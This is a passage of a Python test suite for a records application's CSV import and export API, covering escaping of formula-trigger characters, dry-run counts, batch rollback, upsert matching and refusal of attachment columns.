            [
                {"key": key, "title": rows[key]["title"], "notes": rows[key]["notes"]}
                for key in keys
            ],
            mode="upsert",
            upsert_key="key",
        )
        assert result["errors"] == []
        for key, value in keys.items():
            record = app_services.records.get_record(make_actor(), key)
            assert record.data["title"] == value, value
            assert record.data["notes"] == value, value

    def test_the_two_select_types_over_the_four_printable_triggers(
        self, client: TestClient, app_services: ServiceBundle, widget_type: ObjectType
    ) -> None:
        """The loop **cannot** run over the select types for the `\\t` and `\\r` triggers:
        `_resolve_single_select` and `_resolve_multi_select` both strip whitespace, so
        `'\\tfoo` restores to `foo`. The escape is injective; that pipeline is lossy on
        its own, an accepted cost recorded here rather than left for this loop to
        discover. The four printable triggers round-trip exactly on all four guarded
        types.
        """
        printable = "=+-@"
        values = self._values(printable)
        for key, field_type in (("band", "single_select"), ("labels", "multi_select")):
            app_services.schema.add_field(
                make_actor(),
                "widget",
                {
                    "key": key,
                    "name": key.title(),
                    "type": field_type,
                    "description": f"A {field_type} whose option values begin with a trigger.",
                    "config": {"options": select_options(*values)},
                },
            )
        keys = {
            app_services.records.create_record(
                make_actor(), "widget", {"title": f"row-{i}", "band": value, "labels": [value]}
            ).key: value
            for i, value in enumerate(values)
        }

        rows = self._export_by_key(client)
        exported: list[str] = []
        for key, value in keys.items():
            assert rows[key]["band"] == "'" + value, value
            assert rows[key]["labels"] == "'" + value, value
            exported.append(rows[key]["band"])
        assert len(set(exported)) == len(values)

        result = _upload(
            client,
            "widget",
            ["key", "band", "labels"],
            [
                {"key": key, "band": rows[key]["band"], "labels": rows[key]["labels"]}
                for key in keys
            ],
            mode="upsert",
            upsert_key="key",
        )
        assert result["errors"] == []
        for key, value in keys.items():
            record = app_services.records.get_record(make_actor(), key)
            assert record.data["band"] == value, value
            assert record.data["labels"] == [value], value

    def test_a_value_matching_neither_pattern_is_untouched_on_both_sides(
        self, client: TestClient, app_services: ServiceBundle, widget_type: ObjectType
    ) -> None:
        """The other half of injectivity: an apostrophe run **not** followed by a
        trigger is content, and neither side may touch it."""
        untouched = ["plain", "'quoted", "''double", "a=b", "5 - 3"]
        keys = {
            app_services.records.create_record(
                make_actor(), "widget", {"title": value, "notes": value}
            ).key: value
            for value in untouched
        }
        rows = self._export_by_key(client)
        for key, value in keys.items():
            assert rows[key]["title"] == value, value

        result = _upload(
            client,
            "widget",
            ["key", "title", "notes"],
            [
                {"key": key, "title": rows[key]["title"], "notes": rows[key]["notes"]}
                for key in keys
            ],
            mode="upsert",
            upsert_key="key",
        )
        assert result["errors"] == []
        for key, value in keys.items():
            assert app_services.records.get_record(make_actor(), key).data["title"] == value

    def test_upsert_on_a_unique_field_whose_value_starts_with_a_trigger_updates(
        self, client: TestClient, app_services: ServiceBundle, widget_type: ObjectType
    ) -> None:
        """The property that makes the strip's *placement* correct, not just its
        existence. `code` is a unique `short_text`, so it can be an `upsert_key`;
        the export guards it to `'=A1`. `_match_existing` reads
        `values[unique_field.key]` -- the value `_build_row` has already restored -- and
        not the raw cell, so the row matches and **updates**. Had the strip been placed
        inside the resolvers, or the match read the raw cell, this would silently create
        a second record with a mangled `code` instead.
        """
        original = app_services.records.create_record(
            make_actor(), "widget", {"title": "Signed code", "code": "=A1"}
        )
        exported = self._export_by_key(client)[original.key]
        assert exported["code"] == "'=A1"

        result = _upload(
            client,
            "widget",
            ["code", "title"],
            [{"code": exported["code"], "title": "Renamed"}],
            mode="upsert",
            upsert_key="code",
        )
        assert result == {"dry_run": False, "created": 0, "updated": 1, "errors": []}
        assert len(app_services.records.query_records(make_actor(), "widget").records) == 1
        updated = app_services.records.get_record(make_actor(), original.key)
        assert updated.data["code"] == "=A1"
        assert updated.data["title"] == "Renamed"


# ------------------------------------------------------- an import does what it said


@pytest.fixture()
def filed_type(app_services: ServiceBundle) -> ObjectType:
    """An object type carrying an `attachment` field, which `widget` deliberately omits.

    A field on a new type rather than a ninth field on `widget`: adding one to `_WIDGET_FIELDS`
    would change the exported header of every existing export assertion in this file.
    """
    return app_services.schema.create_object_type(
        make_actor(),
        key="filed",
        name="Filed",
        name_plural="Fileds",
        description="A test object type with an attachment field, for the column refusal.",
        key_prefix="FIL",
        fields=[
            {
                "key": "title",
                "name": "Title",
                "type": "short_text",
                "description": "Short human-readable name for the filed thing.",
            },
            {
                "key": "files",
                "name": "Files",
                "type": "attachment",
                "description": "Attachments carried by this record.",
            },
        ],
    )


def _import_response(
    client: TestClient,
    object_type_key: str,
    header: list[str],
    rows: list[dict[str, str]],
    mode: str,
    upsert_key: str | None = None,
    dry_run: bool = False,
):
    """`_upload` without its `status_code == 200` assertion, for the refusal cases."""
    data = {
        "mode": mode,
        "dry_run": "true" if dry_run else "false",
        "create_missing_options": "false",
    }
    if upsert_key is not None:
        data["upsert_key"] = upsert_key
    return client.post(
        f"/api/v1/object-types/{object_type_key}/import",
        files={"file": ("data.csv", _csv_bytes(header, rows), "text/csv")},
        data=data,
    )


# A clean dry run predicts the commit


def test_clean_dry_run_reports_what_it_would_create_and_writes_nothing(
    client: TestClient, app_services: ServiceBundle, widget_type: ObjectType
) -> None:
    """A clean dry run reports what it would create. A branch that threw the count away
    once made it report `created: 0` on every file."""
    result = _upload(
        client,
        "widget",
        ["title"],
        [{"title": "First"}, {"title": "Second"}],
        mode="create",
        dry_run=True,
    )
    assert result == {"dry_run": True, "created": 2, "updated": 0, "errors": []}
    assert app_services.records.query_records(make_actor(), "widget").total_count == 0


def test_clean_dry_run_splits_created_and_updated_on_an_upsert(
    client: TestClient, app_services: ServiceBundle, widget_type: ObjectType
) -> None:
    """The two counters are distinct predictions, not one number reported twice."""
    existing = app_services.records.create_record(
        make_actor(), "widget", {"title": "Already here", "code": "AAA"}
    )
    result = _upload(
        client,
        "widget",
        ["code", "title"],
        [{"code": "AAA", "title": "Updated"}, {"code": "BBB", "title": "Brand new"}],
        mode="upsert",
        upsert_key="code",
        dry_run=True,
    )
    assert result == {"dry_run": True, "created": 1, "updated": 1, "errors": []}
    # Nothing moved: the existing record still carries its original title.
    assert (
        app_services.records.get_record(make_actor(), existing.key).data["title"] == "Already here"
    )
    assert app_services.records.query_records(make_actor(), "widget").total_count == 1


def test_the_dry_run_count_equals_the_commit_count(
    client: TestClient, app_services: ServiceBundle, widget_type: ObjectType
) -> None:
    """Asserted as the property rather than against literals: the same file, run
    twice, must report the same two numbers. This is the assertion the wizard's
    "would be created" sentence needs in order to be true."""
    app_services.records.create_record(make_actor(), "widget", {"title": "Old", "code": "AAA"})
    header = ["code", "title"]
    rows = [
        {"code": "AAA", "title": "Updated"},
        {"code": "BBB", "title": "New one"},
        {"code": "CCC", "title": "New two"},
    ]
    predicted = _upload(
        client, "widget", header, rows, mode="upsert", upsert_key="code", dry_run=True
    )
    committed = _upload(client, "widget", header, rows, mode="upsert", upsert_key="code")

    assert predicted["errors"] == [] and committed["errors"] == []
    assert (predicted["created"], predicted["updated"]) == (
        committed["created"],
        committed["updated"],
    )
    assert (committed["created"], committed["updated"]) == (2, 1)


# The batch is one transaction, and the dry run sees its own batch


def test_a_duplicate_unique_value_inside_one_file_is_a_dry_run_error(
    client: TestClient, app_services: ServiceBundle, widget_type: ObjectType
) -> None:
    """A dry run that could not see its own batch reported no errors for this file, and
    the commit then wrote row 1 and raised on row 2, keeping row 1. The error names the
    earlier row so the reader can find the other half of the collision."""
    result = _upload(
        client,
        "widget",
        ["code", "title"],
        [{"code": "DUP", "title": "First"}, {"code": "DUP", "title": "Second"}],
        mode="create",
        dry_run=True,
    )
    assert result["created"] == 0
    assert result["updated"] == 0
    assert len(result["errors"]) == 1
    error = result["errors"][0]
    assert error["row"] == 3  # the later row is the one refused
    assert error["field"] == "code"
    assert "row 2" in error["reason"]
    assert app_services.records.query_records(make_actor(), "widget").total_count == 0


def test_a_row_failing_at_write_time_rolls_the_whole_batch_back(
    client: TestClient, app_services: ServiceBundle, widget_type: ObjectType
) -> None:
    """The regression proper. `test_commit_rolls_back_entire_batch_when_one_row_is_bad`
    only ever failed a row in the *validation* pass, so "rolls back" was never measured.

    This file passes validation: the collision is with a record already on disk, which the
    per-row `_check_unique` can only see inside the write transaction. Row 1 is good.
    Committed in its own transaction, row 1 would stay after row 2 raised."""
    app_services.records.create_record(
        make_actor(), "widget", {"title": "Incumbent", "code": "TAKEN"}
    )
    response = _import_response(
        client,
        "widget",
        ["code", "title"],
        [{"code": "FRESH", "title": "Would be row 1"}, {"code": "TAKEN", "title": "Collides"}],
        mode="create",
    )
    assert response.status_code == 422, response.text
    assert response.json()["error"]["code"] == "validation_failed"

    # The whole batch is gone: only the record seeded above survives.
    remaining = app_services.records.query_records(make_actor(), "widget")
    assert remaining.total_count == 1
    assert remaining.records[0]["data"]["code"] == "TAKEN"


def test_two_rows_updating_the_same_record_are_still_allowed(
    client: TestClient, app_services: ServiceBundle, widget_type: ObjectType
) -> None:
    """The boundary of the rule. Two rows carrying one unique value that resolve to the
    *same* existing record are last-one-wins and always have been; only rows competing for
    one value are refused. **Fence**: the one-transaction rule does not change this."""
    existing = app_services.records.create_record(
        make_actor(), "widget", {"title": "Original", "code": "SAME"}
    )
    result = _upload(
        client,
        "widget",
        ["code", "title"],
        [{"code": "SAME", "title": "First write"}, {"code": "SAME", "title": "Second write"}],
        mode="upsert",
        upsert_key="code",
    )
    assert result == {"dry_run": False, "created": 0, "updated": 2, "errors": []}
    assert (
        app_services.records.get_record(make_actor(), existing.key).data["title"] == "Second write"
    )


def test_enum_options_created_by_a_rolled_back_batch_persist(
    client: TestClient, app_services: ServiceBundle, widget_type: ObjectType
) -> None:
    """The one-transaction rule's documented asymmetry, pinned so it stays a decision rather
    than becoming a surprise. Option creation goes through `SchemaService.update_field`,
    which must be wrapped from outside by `_fan_out_scope`, so it commits before the batch
    transaction opens. The option is additive and idempotent and re-running the import
    absorbs it."""
    app_services.records.create_record(
        make_actor(), "widget", {"title": "Incumbent", "code": "HELD"}
    )
    response = client.post(
        "/api/v1/object-types/widget/import",
        files={
            "file": (
                "data.csv",
                _csv_bytes(
                    ["code", "title", "status"],
                    [
                        {"code": "NEW", "title": "Good row", "status": "brand_new_option"},
                        {"code": "HELD", "title": "Collides", "status": "todo"},
                    ],
                ),
                "text/csv",
            )
        },
        data={"mode": "create", "dry_run": "false", "create_missing_options": "true"},
    )
    assert response.status_code == 422, response.text

    # No record from the batch survived...
    assert app_services.records.query_records(make_actor(), "widget").total_count == 1
    # ...but the option it introduced did.
    _, fields = app_services.schema.get_object_type(make_actor(), "widget")
    status = next(f for f in fields if f.key == "status")
    assert "brand_new_option" in {str(o["value"]) for o in status.config["options"]}


# An attachment column is refused rather than dropped


def test_an_attachment_column_with_a_value_is_refused(
    client: TestClient, app_services: ServiceBundle, filed_type: ObjectType
) -> None:
    """Refused, because otherwise the row imports with `errors: []` and the id silently
    vanishes."""
    response = _import_response(
        client,
        "filed",
        ["title", "files"],
        [{"title": "With files col", "files": "8f14e45f-ceea-467a-9d2f-1b2c3d4e5f60"}],
        mode="create",
    )
    assert response.status_code == 422, response.text
    body = response.json()["error"]
    assert body["code"] == "validation_failed"
    assert "files" in body["message"]
    assert body["details"]["columns"] == ["files"]
    assert "/api/v1/attachments" in body["message"]
    assert app_services.records.query_records(make_actor(), "filed").total_count == 0


def test_an_empty_attachment_column_is_refused_on_the_same_terms(
    client: TestClient, filed_type: ObjectType
) -> None:
    """Refused unconditionally rather than only when a cell carries something: a rule
    that accepts the file today and refuses it once somebody fills a cell is not learnable.

    The row matters. `header_columns` is built by iterating the parsed rows, so a header-only
    file names no columns at all and reaches neither this check nor the unknown-column one."""
    response = _import_response(
        client,
        "filed",
        ["title", "files"],
        [{"title": "Empty files cell", "files": ""}],
        mode="create",
    )
    assert response.status_code == 422, response.text
    assert response.json()["error"]["details"]["columns"] == ["files"]


def test_a_file_without_the_attachment_column_still_imports(
    client: TestClient, app_services: ServiceBundle, filed_type: ObjectType
) -> None:
    """The refusal is about the column, not about the object type."""
    result = _upload(client, "filed", ["title"], [{"title": "No files column"}], mode="create")
    assert result == {"dry_run": False, "created": 1, "updated": 0, "errors": []}
